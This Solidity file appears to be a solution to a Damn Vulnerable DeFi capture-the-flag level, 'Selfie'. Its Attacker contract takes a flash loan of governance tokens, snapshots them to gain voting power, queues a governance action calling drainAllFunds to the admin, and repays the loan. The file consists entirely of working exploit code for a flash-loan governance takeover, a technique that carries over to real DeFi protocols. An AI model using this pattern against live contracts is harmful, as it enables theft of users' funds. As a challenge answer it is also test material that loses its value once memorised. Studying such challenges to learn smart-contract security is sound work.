// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract Attacker {
    address private admin;
    DamnValuableTokenSnapshot private dvt;
    SelfiePool private selfiePool;
    SimpleGovernance private simpleGov;

    constructor(
        address _admin,
        address _dvt,
        address _selfiePool,
        address _simpleGov
    ) {
        admin = _admin;
        dvt = DamnValuableTokenSnapshot(_dvt);
        selfiePool = SelfiePool(_selfiePool);
        simpleGov = SimpleGovernance(_simpleGov);
    }

    function goFlashloan(uint256 loan) external {
        selfiePool.flashLoan(loan);
    }

    function receiveTokens(address token, uint256 amount) external {
        // propose gov action with calldata
        dvt.snapshot();
        bytes memory encodedData = abi.encodeWithSelector(SelfiePool.drainAllFunds.selector, admin);
        simpleGov.queueAction(address(selfiePool), encodedData, 0);

        // return flashloan
        dvt.transfer(address(selfiePool), amount);
    }
}
